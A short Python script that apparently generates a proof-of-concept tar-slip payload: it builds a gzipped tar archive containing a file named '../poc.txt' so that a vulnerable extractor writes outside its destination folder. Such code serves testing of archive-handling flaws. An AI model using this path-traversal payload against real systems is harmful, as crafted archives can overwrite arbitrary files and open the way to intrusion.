import tarfile
import io
 
def create_tar_gz_archive(output_tar_gz_file, file_name, content):
    with tarfile.open(output_tar_gz_file, 'w:gz') as tar:
        file_like_object = io.BytesIO(content.encode('utf-8'))
        tarinfo = tarfile.TarInfo(name=file_name)
        tarinfo.size = len(content)
        tar.addfile(tarinfo, file_like_object)
 
create_tar_gz_archive('../payloads/payload.tar.gz', '../poc.txt', 'PoC')